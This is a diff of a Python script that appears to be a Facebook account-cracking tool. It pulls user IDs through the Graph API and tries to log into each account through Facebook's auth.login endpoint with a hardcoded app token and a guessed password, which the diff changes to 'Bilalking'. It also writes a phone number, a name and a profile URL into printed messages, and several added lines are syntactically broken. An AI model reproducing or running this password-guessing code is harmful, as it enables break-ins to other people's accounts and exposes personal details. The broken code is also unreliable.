@@ -112,7 +112,7 @@ def login():
 		        t()
 		        login()
 		    else:
-		        print (R + 'number/user id/ password is wrong !')
+		        print (R + 'number 03018959991/user id https://www.facebook.com/profile.php?id=100064197562020/ password is wrong !')
 		        trb()
 		        t()
 		        login()
@@ -139,8 +139,8 @@ def menu():
 		exb()
 	cb()
 	print (logo)
-	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'[Bilal Dogar])
-	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'. https://www.facebook.com/profile.php?id=100064197562020)
+	print (S + '[☆] ' + G + 'ID Name:Bilal Dogar' + R + a['name'[Bilal Dogar])
+	print (S + '[☆] ' + G + 'User ID: https://www.facebook.com/profile.php?id=100064197562020' + R + a['id'. https://www.facebook.com/profile.php?id=100064197562020)
 	print
 	print (S + 50*'-')
 	print
@@ -279,7 +279,7 @@ def pb():
 		try:
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
 			j=json.loads(h.text)
-			ps1=('786786')
+			ps1=('Bilalking')
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
